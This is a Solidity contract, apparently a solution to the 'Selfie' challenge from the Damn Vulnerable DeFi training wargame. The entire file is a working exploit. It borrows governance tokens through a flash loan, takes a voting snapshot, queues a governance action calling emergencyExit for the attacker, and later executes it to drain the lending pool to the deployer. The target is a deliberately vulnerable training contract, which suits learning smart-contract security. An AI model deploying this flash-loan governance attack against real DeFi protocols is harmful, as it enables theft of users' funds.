// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./ISimpleGovernance.sol";

contract SelfieAttacker is IERC3156FlashBorrower {
    uint256 public snapshotId;
    ISimpleGovernance private governance;
    IERC3156FlashLender private pool;
    uint256 public actionId;
    address public deployer;

    constructor(address _pool, address _governance) {
        governance = ISimpleGovernance(_governance);
        pool = IERC3156FlashLender(_pool);
        deployer = msg.sender;
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        DamnValuableTokenSnapshot _token = DamnValuableTokenSnapshot(token);

        snapshotId = _token.snapshot();

        bytes memory _data = abi.encodeWithSignature(
            "emergencyExit(address)",
            deployer
        );
        actionId = governance.queueAction(address(pool), uint128(0), _data);

        bool res = _token.approve(address(pool), amount + fee);

        require(res, "approve failed");

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function drain(address _token) external {
        governance.executeAction(actionId);

        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);

        if (token.balanceOf(deployer) == 0) {
            revert("Failed to drain funds");
        }
    }
}
